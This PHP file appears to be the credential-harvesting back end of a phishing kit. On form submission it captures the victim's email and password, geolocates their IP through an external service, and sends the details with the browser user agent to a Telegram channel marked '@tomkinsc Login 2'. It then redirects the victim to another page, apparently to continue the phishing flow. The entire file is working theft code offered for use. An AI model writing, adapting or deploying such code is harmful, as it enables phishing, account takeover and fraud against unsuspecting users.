<?php
session_start();
require "config.php";

function visitor_location()
{
    $ip = $_SERVER["REMOTE_ADDR"];
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ip = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
    }

    $location = [
        "country" => "Unknown",
        "city" => "Unknown",
        "state" => "Unknown",
        "ip" => $ip,
    ];

    $ch = curl_init("http://ip-api.com/json/{$ip}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response);
        if ($data && $data->status === "success") {
            $location["country"] = $data->country;
            $location["city"] = $data->city;
            $location["state"] = $data->regionName;
        }
    }
    return $location;
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $location = visitor_location();
    $browser = $_SERVER["HTTP_USER_AGENT"];
    $adddate = date("D M d, Y g:i a");

    $message = "      _______
  ___//       \\

  @tomkinsc
        Login 2

Email : {$_POST["ids"]}
Password : {$_POST["passwordx"]}

Country : {$location["country"]}
IP Address : {$location["ip"]}
City : {$location["city"]}
State : {$location["state"]}
Date : $adddate
User-Agent: $browser
----------------------------------------";

    send_telegram_msg($message);
}

header("Location: indexsq.php");
exit();
